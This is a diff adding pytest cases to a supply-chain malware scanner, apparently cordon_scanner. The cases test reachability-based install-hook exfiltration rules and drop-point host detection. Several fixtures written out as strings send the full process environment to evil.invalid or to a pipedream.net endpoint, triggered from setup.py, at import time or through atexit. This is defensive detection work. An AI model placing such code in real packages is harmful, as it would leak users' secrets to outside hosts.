@@ -12144,3 +12144,222 @@ class TestMakeSpellsEvalItsOwnWay:
             encoding="utf-8",
         )
         assert self._fires(tmp_path)
+
+
+class TestImportingAModuleDoesNotCallIt:
+    """`pytorch/pytorch` was told to treat its host as compromised.
+
+    `MALWARE.EXFIL.001`, critical, MALICIOUS, on `torch/hub.py`: inside
+    `_validate_not_a_forked_repo` the module reads `GITHUB_TOKEN` from the
+    environment and sends it to `api.github.com` in an `Authorization` header,
+    which is what a GitHub token is for.
+
+    It was reachable because `setup.py` at the distribution root does
+    `import torch` -- ordinary, and how a packaging script reads `__version__` --
+    so `_hook_import_closure` put the whole library in `install_hook_paths` and
+    every credential beside a network call in it became install-time.
+
+    Importing a module runs its top level and DEFINES its functions. The claim
+    the rule makes, "executes automatically on every install", is false for a
+    function nothing on the install path calls.
+
+    The obvious rule -- only module-level code carries the context -- is wrong,
+    and the second test is why: it would reopen the relocation bypass the import
+    closure was built to close. The question is not where the code is written
+    but whether anything reaches it.
+    """
+
+    def _findings(self, root):
+        return {f.rule_id for f in Scanner().scan(root).findings}
+
+    def test_a_library_reached_because_setup_reads_its_version(self, tmp_path) -> None:
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\nimport mylib\n\nsetup(name='mylib')\n",
+            encoding="utf-8",
+        )
+        package = tmp_path / "mylib"
+        package.mkdir()
+        (package / "__init__.py").write_text("from mylib import hub\n", encoding="utf-8")
+        (package / "hub.py").write_text(
+            "import os\n"
+            "from urllib.request import urlopen\n"
+            "\n"
+            "def _validate(owner):\n"
+            "    token = os.environ.get('GITHUB_TOKEN')\n"
+            "    return urlopen('https://api.github.com/repos/' + owner).read()\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" not in self._findings(tmp_path)
+
+    def test_the_relocation_bypass_is_still_caught(self, tmp_path) -> None:
+        """The guard, and the reason this is a call graph and not a line test.
+
+        Every capability here is inside a `def` too. The difference is the one
+        line in `setup.py` that calls it.
+        """
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\nimport _bootstrap\n\n"
+            "_bootstrap.init()\nsetup(name='mylib')\n",
+            encoding="utf-8",
+        )
+        (tmp_path / "_bootstrap.py").write_text(
+            "import os\n"
+            "from urllib.request import urlopen\n"
+            "\n"
+            "def init():\n"
+            "    urlopen('https://evil.invalid/x', data=str(dict(os.environ)).encode())\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" in self._findings(tmp_path)
+
+    def test_a_payload_at_module_level_is_still_caught(self, tmp_path) -> None:
+        """The other guard. Top-level code runs on import, so a helper that does
+        its work as a side effect of being imported needs no call at all."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\nimport _bootstrap\n\nsetup(name='mylib')\n",
+            encoding="utf-8",
+        )
+        (tmp_path / "_bootstrap.py").write_text(
+            "import os\n"
+            "from urllib.request import urlopen\n"
+            "\n"
+            "urlopen('https://evil.invalid/x', data=str(dict(os.environ)).encode())\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" in self._findings(tmp_path)
+
+    def test_a_decorated_function_is_never_deferred(self, tmp_path) -> None:
+        """A decorator can register a function to be called from somewhere this
+        analysis cannot see, which is how a plugin, a CLI and a task queue all
+        work. Conservative on purpose: this decides the most serious claim the
+        tool makes."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\nimport _bootstrap\n\nsetup(name='mylib')\n",
+            encoding="utf-8",
+        )
+        (tmp_path / "_bootstrap.py").write_text(
+            "import os\n"
+            "import atexit\n"
+            "from urllib.request import urlopen\n"
+            "\n"
+            "@atexit.register\n"
+            "def init():\n"
+            "    urlopen('https://evil.invalid/x', data=str(dict(os.environ)).encode())\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" in self._findings(tmp_path)
+
+
+class TestAModuleThatExplainsWhatItDrives:
+    """`unslothai/unsloth` opens `studio/backend/cloudflare_tunnel.py` by saying
+    that "cloudflared quick tunnel gives a free https://*.trycloudflare.com URL
+    that works anywhere, with no account".
+
+    That is an accurate description of the tool the module drives, and
+    `trycloudflare.com` is on the drop-point host list precisely because the
+    property being described -- no account, reachable anywhere -- makes it a
+    good exfiltration endpoint. `_destination_capabilities` searched the raw
+    bytes and took the first hit, so the sentence counted as contacting it, and
+    a `platform.machine()` call a hundred lines below completed the pair.
+
+    A string is also how a real request is written, so "inside a string" cannot
+    separate the two. A docstring can: it is a bare string expression, never an
+    argument to a call.
+    """
+
+    def _fires(self, root) -> bool:
+        return any(
+            f.rule_id == "SUSPECT.EXFIL.DROP_POINT.001" for f in Scanner().scan(root).findings
+        )
+
+    def test_the_opening_paragraph_is_not_a_request(self, tmp_path) -> None:
+        (tmp_path / "tunnel.py").write_text(
+            '"""Drives cloudflared.\n\n'
+            "A quick tunnel gives a free https://x.trycloudflare.com URL with no\n"
+            'account, which is why it is convenient.\n"""\n'
+            "import platform\n"
+            "\n"
+            "def asset():\n"
+            "    return platform.system(), platform.machine()\n",
+            encoding="utf-8",
+        )
+        assert not self._fires(tmp_path)
+
+    def test_a_request_to_one_still_fires(self, tmp_path) -> None:
+        """The guard. The host in a call, rather than in the paragraph
+        explaining the module, is the thing the rule is about."""
+        (tmp_path / "beacon.py").write_text(
+            '"""Telemetry helper."""\n'
+            "import os\n"
+            "import platform\n"
+            "from urllib.request import urlopen, Request\n"
+            "\n"
+            "def report():\n"
+            '    body = f"{platform.node()}/{platform.machine()}/{dict(os.environ)}"\n'
+            '    urlopen(Request("https://abc123.m.pipedream.net/ingest", data=body.encode()))\n',
+            encoding="utf-8",
+        )
+        assert self._fires(tmp_path)
+
+
+class TestTheCeilingThatTurnedTheAnalysisOff:
+    """`CallReachability` declines to run above `MAX_FUNCTIONS` and defers
+    nothing, which keeps every finding -- the safe direction, and the reason the
+    number has to be generous rather than cautious.
+
+    It was set to 5,000. `ImportClosure` already bounds a closure to 500 files,
+    and 500 files of a library the size of `torch` carry around three times that
+    many definitions, so the analysis would have switched itself off on exactly
+    the repositories it was written for, and switched off silently. Every test
+    above uses a handful of functions and would have stayed green.
+
+    Measured at the time: 15,000 definitions across 500 files takes 0.6s, so the
+    low ceiling was never buying anything.
+    """
+
+    @staticmethod
+    def _closure(definitions: int, per_file: int) -> dict[str, str]:
+        files = definitions // per_file
+        sources = {"setup.py": "import pkg0\n"}
+        for index in range(files):
+            body = ["import os"]
+            if index + 1 < files:
+                body.append(f"import pkg{index + 1}")
+            for n in range(per_file):
+                body += [f"def fn_{index}_{n}():", "    return os.environ.get('X')", ""]
+            sources[f"pkg{index}.py"] = "\n".join(body) + "\n"
+        return sources
+
+    def test_a_closure_larger_than_the_old_ceiling_is_still_analysed(self) -> None:
+        from cordon_scanner.core.reachability import CallReachability
+
+        sources = self._closure(6_000, 40)
+        deferred = CallReachability.deferred_lines(sources.keys(), sources)
+        assert len(deferred) == 6_000, "6,000 definitions, none of them called"
+
+    def test_the_ceiling_is_generous_enough_for_a_full_closure(self) -> None:
+        """Pinned against the bound that feeds it. A closure is at most
+        `ImportClosure.MAX_FILES` files, and a file of thirty functions is
+        unremarkable -- so the ceiling has to clear that product or it is a
+        ceiling on the common case rather than on the pathological one."""
+        from cordon_scanner.core.closure import MAX_FILES
+        from cordon_scanner.core.reachability import MAX_FUNCTIONS
+
+        assert MAX_FUNCTIONS >= MAX_FILES * 30
+
+    def test_above_the_ceiling_nothing_is_deferred(self) -> None:
+        """The direction of the fallback, which is the part that must not
+        change: an analysis that gave up by dropping context would turn its own
+        ceiling into a way to hide a payload behind enough dead code."""
+        from cordon_scanner.core import reachability
+
+        sources = self._closure(200, 20)
+        assert reachability.CallReachability.deferred_lines(sources.keys(), sources)
+        original = reachability.MAX_FUNCTIONS
+        reachability.MAX_FUNCTIONS = 10
+        try:
+            assert (
+                reachability.CallReachability.deferred_lines(sources.keys(), sources) == frozenset()
+            )
+        finally:
+            reachability.MAX_FUNCTIONS = original
